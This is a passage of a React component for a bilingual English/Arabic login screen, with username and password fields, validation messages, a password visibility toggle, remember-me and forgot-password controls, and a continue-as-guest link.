                                {t.to}
                            </span>
                            <span
                                className="text-[22px] font-extrabold text-[#1e2b4d]"
                                style={{ fontFamily: "var(--font-nunito), system-ui, sans-serif" }}
                            >
                                {t.brand}
                            </span>
                        </div>
                    </div>
                    <button
                        onClick={() => setLanguage(isRTL ? "en" : "ar")}
                        className="text-[15px] text-[#6b7280] hover:text-[#4b5563] transition-colors mt-1"
                    >
                        {t.langToggle}
                    </button>
                </div>

                {/* Form */}
                <div className="space-y-5">
                    {/* Username */}
                    <div>
                        <label
                            className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                        >
                            {t.username}
                        </label>
                        <input
                            type="text"
                            value={username}
                            onChange={(e) => {
                                setUsername(e.target.value)
                                if (touched.username) setErrors(prev => ({ ...prev, username: undefined }))
                            }}
                            onBlur={() => {
                                setTouched(prev => ({ ...prev, username: true }))
                                if (!username.trim()) setErrors(prev => ({ ...prev, username: t.usernameRequired }))
                            }}
                            className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${errors.username && touched.username
                                ? "border-red-500 focus:border-red-500"
                                : "border-[#e5e7eb] focus:border-[#9ca3af]"
                                }`}
                            style={{ direction: "ltr" }}
                        />
                        {errors.username && touched.username && (
                            <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                                {errors.username}
                            </p>
                        )}
                    </div>

                    {/* Password */}
                    <div>
                        <label
                            className={`block text-[14px] text-[#9ca3af] mb-2 ${isRTL ? "text-right" : "text-left"}`}
                        >
                            {t.password}
                        </label>
                        <div className="relative">
                            <input
                                type={showPassword ? "text" : "password"}
                                value={password}
                                onChange={(e) => {
                                    setPassword(e.target.value)
                                    if (touched.password) setErrors(prev => ({ ...prev, password: undefined }))
                                }}
                                onBlur={() => {
                                    setTouched(prev => ({ ...prev, password: true }))
                                    if (!password) {
                                        setErrors(prev => ({ ...prev, password: t.passwordRequired }))
                                    } else if (password.length < 6) {
                                        setErrors(prev => ({ ...prev, password: t.passwordMinLength }))
                                    }
                                }}
                                className={`w-full h-[52px] px-4 rounded-lg border bg-white text-[16px] text-[#1f2937] focus:outline-none transition-colors ${errors.password && touched.password
                                    ? "border-red-500 focus:border-red-500"
                                    : "border-[#e5e7eb] focus:border-[#9ca3af]"
                                    }`}
                                style={{ direction: "ltr" }}
                            />
                            <button
                                type="button"
                                onClick={() => setShowPassword(!showPassword)}
                                className={`absolute top-1/2 -translate-y-1/2 text-[14px] text-[#9ca3af] hover:text-[#6b7280] transition-colors ${isRTL ? "left-4" : "right-4"}`}
                            >
                                {showPassword ? t.hide : t.show}
                            </button>
                        </div>
                        {errors.password && touched.password && (
                            <p className={`text-[12px] text-red-500 mt-1 ${isRTL ? "text-right" : "text-left"}`}>
                                {errors.password}
                            </p>
                        )}
                    </div>

                    {/* Remember Me & Forgot Password */}
                    <div className="flex items-center justify-between">
                        {isRTL ? (
                            <>
                                <button
                                    onClick={onForgotPassword}
                                    className="text-[14px] text-[#6b7280] underline hover:text-[#4b5563] transition-colors"
                                >
                                    {t.forgotPassword}
                                </button>
                                <label className="flex items-center gap-2.5 cursor-pointer">
                                    <span className="text-[14px] text-[#4b5563]">{t.rememberMe}</span>
                                    <div
                                        onClick={() => setRememberMe(!rememberMe)}
                                        className={`w-[22px] h-[22px] rounded border-2 flex items-center justify-center transition-colors cursor-pointer ${rememberMe
                                            ? "bg-[#1e2b4d] border-[#1e2b4d]"
                                            : "bg-white border-[#d1d5db]"
                                            }`}
                                    >
                                        {rememberMe && (
                                            <svg width="12" height="10" viewBox="0 0 12 10" fill="none">
                                                <path d="M1 5L4.5 8.5L11 1" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                            </svg>
                                        )}
                                    </div>
                                </label>
                            </>
                        ) : (
                            <>
                                <label className="flex items-center gap-2.5 cursor-pointer">
                                    <div
                                        onClick={() => setRememberMe(!rememberMe)}
                                        className={`w-[22px] h-[22px] rounded border-2 flex items-center justify-center transition-colors cursor-pointer ${rememberMe
                                            ? "bg-[#1e2b4d] border-[#1e2b4d]"
                                            : "bg-white border-[#d1d5db]"
                                            }`}
                                    >
                                        {rememberMe && (
                                            <svg width="12" height="10" viewBox="0 0 12 10" fill="none">
                                                <path d="M1 5L4.5 8.5L11 1" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                                            </svg>
                                        )}
                                    </div>
                                    <span className="text-[14px] text-[#4b5563]">{t.rememberMe}</span>
                                </label>
                                <button
                                    onClick={onForgotPassword}
                                    className="text-[14px] text-[#6b7280] underline hover:text-[#4b5563] transition-colors"
                                >
                                    {t.forgotPassword}
                                </button>
                            </>
                        )}
                    </div>
                </div>

                {/* Buttons */}
                <div className="mt-8 space-y-4">
                    <button
                        onClick={handleSignIn}
                        className="w-full h-[56px] rounded-lg text-white text-[17px] font-semibold transition-colors hover:opacity-90"
                        style={{ backgroundColor: "#8b95a5" }}
                    >
                        {t.signIn}
                    </button>
                    <button
                        onClick={onBack}
                        className="w-full h-[56px] rounded-lg border-2 border-[#d1d5db] bg-white text-[#1f2937] text-[17px] font-semibold hover:bg-[#f9fafb] transition-colors"
                    >
                        {t.signInCustomer}
                    </button>
                </div>
            </div>

            {/* Bottom Section with Curve */}
            <div className="relative">
                {/* Curved Background */}
                <div
                    className="absolute inset-0 overflow-hidden"
                    style={{ height: "140px" }}
                >
                    <svg
                        viewBox="0 0 400 140"
                        fill="none"
                        preserveAspectRatio="none"
                        className="w-full h-full"
                    >
                        <path
                            d="M0 50 Q200 0 400 50 L400 140 L0 140 Z"
                            fill="#e8f4f8"
                        />
                    </svg>
                </div>

                {/* Bottom Links */}
                <div className="relative z-10 pt-12 pb-10 text-center">
                    <button className="text-[15px] text-[#4b5563] underline font-medium hover:text-[#374151] transition-colors">
                        {t.continueGuest}
                    </button>
                </div>
            </div>
        </div>
    )
}
